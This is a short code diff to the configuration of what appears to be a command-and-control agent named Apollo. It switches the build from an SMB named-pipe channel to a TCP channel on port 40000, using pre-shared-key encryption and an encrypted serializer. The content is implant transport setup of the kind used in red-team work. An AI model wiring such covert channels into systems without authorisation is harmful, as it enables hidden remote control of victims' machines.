@@ -1,4 +1,4 @@
-﻿#define SMB
+﻿#define TCP
 
 
 using HttpTransport;
@@ -10,6 +10,7 @@ using ApolloInterop.Structs.ApolloStructs;
 using PSKCryptography;
 using ApolloInterop.Serializers;
 using NamedPipeTransport;
+using TcpTransport;
 
 namespace Apollo
 {
@@ -51,6 +52,20 @@ namespace Apollo
                     Parameters = new Dictionary<string, string>()
                     {
                         { "pipename", "p39kmyt7-ro3l-c3id-vo2v-6efqxg1dxshh" },
+                        { "encrypted_exchange_check", "T" },
+                    }
+                }
+            },
+#endif
+#if TCP
+            { "tcp", new C2ProfileData()
+                {
+                    TC2Profile = typeof(TcpProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+                        { "port", "40000" },
                         { "encrypted_exchange_check", "T" },
                     }
                 }
